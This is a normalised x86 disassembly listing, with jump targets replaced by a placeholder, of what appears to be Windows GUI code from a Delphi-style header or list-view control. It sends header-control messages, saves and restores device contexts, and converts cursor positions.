mov eax ebx
call sub_416e68
push eax
push edi
mov eax esi
call sub_448484
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_474764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_474668
sub_474788
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_448484
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_448484
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_474668
inc edi
dec ebx
jne r-xdata
sub_474804
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_422134
xor eax eax
push ebp
push sub_474905
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_421dfc
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47490c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_422568
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4223e0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_47491c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4038bc
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_4417ac
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4038bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47514c
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_428fd8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_474ab2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_428fd8
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_474ee0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_474be4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_474c1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445f34
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_474be4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441f8c
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_474cc0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_443404
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_473f64
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_474d20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446ad4
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_474ebb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_441768
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_474e9e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_416044
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4161a0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_473f64
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4161a0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_473ebc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_416090
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_474ee0
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_4038bc
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_474f00
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_474f34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_44fc00
mov eax ebx
call sub_448484
xor edx edx
call sub_428ff4
mov edx [ ebx + 0x224 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_41e274
mov eax [ ebx + 0x228 ]
call sub_44ef40
push eax
mov eax ebx
call sub_448484
pop edx
call sub_428ff4
jmp r-xdata
mov eax ebx
call sub_474788
pop esi
pop ebx
retn
sub_474fa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_44ef40
push eax
mov eax ebx
call sub_448484
pop edx
call sub_428ff4
mov eax ebx
call sub_474788
pop esi
pop ebx
retn
sub_474fd0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_475020
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47513f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_47511c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_417184
push eax
mov eax esi
call sub_416e68
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448484
mov ecx [ ebp - 0x4 ]
pop edx
call sub_429004
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475123
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_473f64
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_47514c
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_473f64
pop edx
call sub_475020
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4038bc
pop esi
pop ecx
pop ebp
retn
sub_4751c8
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_475210
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4753d0
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x8 ]
call sub_4048dc
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4753d0
mov esi eax
mov eax ebx
call sub_4753d0
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2d4 ]
call [ esi + 0x2d0 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_475294
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x1c ] 0xffffffff
mov [ edi + 0x20 ] 0xffffffff
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4752e0
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x4 ]
call sub_476ed4
mov [ ebp + 0x24 ] 0x1
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
cmp ebp [ eax + 0x238 ]
jne r-xdata
mov eax [ eax + 0x278 ]
mov edx ebp
call sub_416340
mov eax ebp
call sub_475b70
mov esi eax
test esi esi
je r-xdata
xor edx edx
mov [ eax + 0x238 ] edx
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov edx ebp
mov si 0xffad
call sub_4038bc
mov edx ebp
mov eax esi
call sub_475e98
inc eax
je r-xdata
xor edx edx
mov eax ebp
call sub_4754ac
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_416a58
test bl bl
jle r-xdata
mov eax ebp
call sub_4753bc
mov edx [ ebp + 0x10 ]
call sub_429438
xor edi edi
mov edi 0x1
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403a74
xor edx edx
mov eax ebp
call sub_475978
xor edx edx
mov eax esi
call sub_475b38
mov edx edi
mov eax esi
call sub_4757a0
test al al
je r-xdata
sub_4753d8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al 0x1
mov eax ebx
call sub_475b70
test eax eax
jne r-xdata
mov eax ebx
call sub_475b70
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_475b70
mov edx esi
call sub_4753d8
pop esi
pop ebx
retn
mov al 0x1
jmp r-xdata
pop esi
pop ebx
retn
sub_475418
push ebx
push esi
add esp 0xffffffd8
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404828
je r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404480
mov [ esp ] 0x1
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
mov eax ebx
call sub_4753d0
mov al [ eax + 0x25b ]
add al 0xfe
sub al 0x2
jae r-xdata
cmp [ ebx + 0x25 ] 0x0
je r-xdata
mov eax ebx
call sub_475b70
test eax eax
je r-xdata
mov eax ebx
call sub_4753d0
xor edx edx
call sub_4777ec
mov eax ebx
call sub_475b70
xor edx edx
call sub_476284
jmp r-xdata
sub_4754ac
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop ebx
retn
cmp edx [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_4753d0
mov al [ eax + 0x25b ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4753d0
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
sub al 0x2
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
cmp [ ebx + 0x25 ] 0x0
je r-xdata
mov eax ebx
call sub_475b70
test eax eax
je r-xdata
mov eax ebx
call sub_4753d0
xor edx edx
call sub_4777ec
mov eax ebx
call sub_475b70
xor edx edx
call sub_476284
jmp r-xdata
sub_47551c
push ebx
push esi
add esp 0xffffffd4
mov [ esp ] dl
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
add esp 0x2c
pop esi
pop ebx
retn
mov [ esp + 0x1 ] 0x8
mov eax [ esi + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax esi
call sub_4753bc
lea edx [ esp + 0x1 ]
call sub_4295dc
test eax eax
je r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x4
ja r-xdata
jmp [ eax * 4 + jump_table_475562 ]
test [ esp + 0x9 ] 0x4
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x1
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x2
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x20
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x8
setne bl
sub_4755b0
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
mov [ esp ] 0x8
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
xor eax eax
mov al dl
cmp eax 0x4
ja r-xdata
test cl cl
je r-xdata
jmp [ eax * 4 + jump_table_4755de ]
xor eax eax
mov [ esp + 0x8 ] eax
mov eax [ esp + 0xc ]
and eax 0xffffffff
mov [ esp + 0x8 ] eax
jmp r-xdata
mov [ esp + 0xc ] 0x4
jmp r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov [ esp + 0xc ] 0x20
jmp r-xdata
mov [ esp + 0xc ] 0x8
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
sub_47564c
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
cmp edx [ ebx + 0x14 ]
je r-xdata
mov eax edx
mov [ ebx + 0x14 ] eax
mov [ esp ] 0x12
mov edx [ ebx + 0x10 ]
mov [ esp + 0x4 ] edx
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x4 ]
cmp [ edx + 0x31a ] 0x0
je r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x18 ] 0xffffffff
jmp r-xdata
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
sub_4756a4
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
cmp edx [ ebx + 0x18 ]
je r-xdata
mov eax edx
mov [ ebx + 0x18 ] eax
mov [ esp ] 0x30
mov edx [ ebx + 0x10 ]
mov [ esp + 0x4 ] edx
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x4 ]
cmp [ edx + 0x322 ] 0x0
je r-xdata
mov [ esp + 0x1c ] eax
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
sub_4756fc
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
cmp edx [ ebx + 0x1c ]
je r-xdata
mov esi edx
mov [ ebx + 0x1c ] esi
mov [ esp ] 0x18
mov [ esp + 0xc ] 0xf00
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
mov eax esi
inc eax
call sub_428f54
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
sub_47574c
push ebx
push esi
add esp 0xffffffd8
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
cmp esi [ ebx + 0x20 ]
je r-xdata
mov [ ebx + 0x20 ] esi
test esi esi
jl r-xdata
mov [ esp ] 0x18
mov [ esp + 0xc ] 0xf000
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x1 ]
call sub_429058
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
dec esi
sub_4757a0
push ebx
push esi
push edi
mov esi edx
xor edi edi
xor ebx ebx
call sub_475cbc
test eax eax
je r-xdata
cmp esi edi
jne r-xdata
inc edi
mov edx eax
call sub_475cac
cmp esi edi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
test eax eax
jne r-xdata
sub_4757d0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_475ad0
test al al
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax esi
call sub_4753d0
mov edx esi
mov si 0xffb1
call sub_4038bc
mov ebx eax
mov eax esi
call sub_4753d0
mov edx esi
mov si 0xffb0
call sub_4038bc
mov ebx eax
jmp r-xdata
sub_475824
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_475ad0
test al al
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4753d0
mov edx esi
mov si 0xffae
call sub_4038bc
mov eax esi
call sub_4753d0
mov edx esi
mov si 0xffaa
call sub_4038bc
jmp r-xdata
sub_475868
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test cl cl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov [ eax + 0x245 ] 0x1
xor eax eax
push ebp
push sub_47594b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test bl bl
je r-xdata
mov esi [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4757d0
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4757d0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4753d8
test al al
jne r-xdata
test esi esi
je r-xdata
mov esi 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_475824
mov esi 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_475824
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax esi
call sub_475868
mov eax esi
call sub_475d18
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
xor eax eax
pop edx
